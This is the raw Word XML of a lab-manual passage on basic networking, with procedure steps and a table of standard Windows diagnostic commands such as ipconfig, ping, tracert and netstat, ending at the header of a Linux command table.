      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Verify that the commands execute successfully.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC0D4AC" w14:textId="1B83DDC2" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Record the commands used and complete the experiment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26ABBC87"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p>
    <w:p w14:paraId="256C4C0E"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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Procedure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46AE73BA" w14:textId="2CDF298E" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Boot the system into </w:t>
      </w:r>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Windows</w:t>
      </w:r>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Ubuntu Linux</w:t>
      </w:r>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9A7AB7" w14:textId="0849EA68" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Connect the system to a network (LAN or Wi-Fi).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A6297A6" w14:textId="16B245A4" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Open </w:t>
      </w:r>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Command Prompt</w:t>
      </w:r>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Windows) or </w:t>
      </w:r>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Terminal</w:t>
      </w:r>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Linux).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536074A0" w14:textId="50265E59" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Execute the commands listed below one at a time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3666F63E" w14:textId="6AFE57E4" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Note the purpose of each command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27017361" w14:textId="3A7EC4AF" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Compare the equivalent networking commands in both operating systems.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB41552" w14:textId="2C4C34FB" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Close the Command Prompt/Terminal after completing the experiment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C7A77E8" w14:textId="65A17B60" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A673C5C" w14:textId="77777777" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C30E774" w14:textId="77777777" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="398F6975" w14:textId="77777777" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57155C5C" w14:textId="77777777" w:rsidR="004967CD" w:rsidRDefault="004967CD" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32F49480" w14:textId="77777777" w:rsidR="004967CD" w:rsidRDefault="004967CD" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7267E362" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="167A35FC" w14:textId="57C9C3C3"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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Windows Networking Commands</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellMar>
          <w:top w:w="15" w:type="dxa"/>
          <w:left w:w="15" w:type="dxa"/>
          <w:bottom w:w="15" w:type="dxa"/>
          <w:right w:w="15" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3251"/>
        <w:gridCol w:w="7073"/>
      </w:tblGrid>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="7A663FB6" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6975BD6A" w14:textId="6BF1CB10" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
            <w:pPr>
              <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="720"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004967CD">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>Command</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="64F0868A" w14:textId="77777777" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
            <w:pPr>
              <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="720"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004967CD">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="69528BD2" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3FA71251"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ipconfig</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0776882B"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Displays the IP configuration of the system.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="228F31A5" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1ECAEBF4"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ipconfig /all</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69CAC25C"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Displays detailed network configuration.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="15235D10" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A7041D5"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ping &lt;hostname/IP&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6F9A7FBD"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Checks network connectivity with another host.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="316E7DCD" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="08B5FBC4"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tracert &lt;hostname/IP&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="48885695"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Displays the route taken by packets to the destination.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="4009A7C7" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="76DCFBFC"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arp -a</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="16BBDC93"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Displays the ARP cache table.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="5FC4086D" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4D7655DC"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route print</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4FC8A739"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Displays the routing table.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="0839263A" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7E842BD0"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netstat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F91D22F"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Displays active network connections and listening ports.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="503B9EA6" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="137C27AF"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hostname</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D0B2949"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Displays the computer name.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="01B1AB2F" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1A422AF0"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nslookup &lt;domain&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7775EA7D"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Retrieves DNS information for a domain.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1800E199"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p>
    <w:p w14:paraId="74DB74E9"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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Linux Networking Commands</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellMar>
          <w:top w:w="15" w:type="dxa"/>
          <w:left w:w="15" w:type="dxa"/>
          <w:bottom w:w="15" w:type="dxa"/>
          <w:right w:w="15" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3632"/>
        <w:gridCol w:w="6837"/>
      </w:tblGrid>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="66B113E9" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="222106AF" w14:textId="77777777" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
            <w:pPr>
              <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="720"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004967CD">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>Command</w:t>
            </w:r>
